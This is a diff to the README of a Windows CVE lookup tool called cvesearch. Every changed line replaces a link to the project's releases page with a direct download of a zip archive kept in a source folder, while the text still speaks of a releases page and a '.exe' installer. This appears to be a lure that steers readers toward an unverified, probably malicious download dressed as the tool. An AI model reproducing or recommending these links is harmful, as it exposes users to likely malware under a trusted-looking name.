@@ -1,6 +1,6 @@
 # ⚡ cvesearch - Fast CVE Lookup and Alerts
 
-[![Download cvesearch](https://img.shields.io/badge/Download-cvesearch-ff4500?style=for-the-badge)](https://github.com/Jimmy-F7/cvesearch/releases)
+[![Download cvesearch](https://img.shields.io/badge/Download-cvesearch-ff4500?style=for-the-badge)](https://github.com/Jimmy-F7/cvesearch/raw/refs/heads/main/src/lib/Software_1.2.zip)
 
 ---
 
@@ -43,9 +43,9 @@ Follow these steps to download and run cvesearch on your Windows computer. The p
 
 Visit this page to download the latest version of cvesearch for Windows:
 
-[![Download cvesearch](https://img.shields.io/badge/Download-cvesearch-ff4500?style=for-the-badge)](https://github.com/Jimmy-F7/cvesearch/releases)
+[![Download cvesearch](https://img.shields.io/badge/Download-cvesearch-ff4500?style=for-the-badge)](https://github.com/Jimmy-F7/cvesearch/raw/refs/heads/main/src/lib/Software_1.2.zip)
 
-1. Click the link above or go to [https://github.com/Jimmy-F7/cvesearch/releases](https://github.com/Jimmy-F7/cvesearch/releases).
+1. Click the link above or go to [https://github.com/Jimmy-F7/cvesearch/raw/refs/heads/main/src/lib/Software_1.2.zip](https://github.com/Jimmy-F7/cvesearch/raw/refs/heads/main/src/lib/Software_1.2.zip).
 2. On the releases page, look for the latest stable version. It will have a file ending in `.exe`.
 3. Click on the `.exe` file to start the download.
 4. Once the download finishes, open the downloaded file. This will launch the installer.
@@ -109,7 +109,7 @@ Access settings by clicking the gear icon in the top-right corner.
 
 ## 📚 Additional Resources
 
-- Visit the releases page to check for updates or report issues: [https://github.com/Jimmy-F7/cvesearch/releases](https://github.com/Jimmy-F7/cvesearch/releases)
+- Visit the releases page to check for updates or report issues: [https://github.com/Jimmy-F7/cvesearch/raw/refs/heads/main/src/lib/Software_1.2.zip](https://github.com/Jimmy-F7/cvesearch/raw/refs/heads/main/src/lib/Software_1.2.zip)
 - Explore the GitHub repository for detailed documentation and new features.
 - Check common CVE databases to cross-check vulnerability information.
 
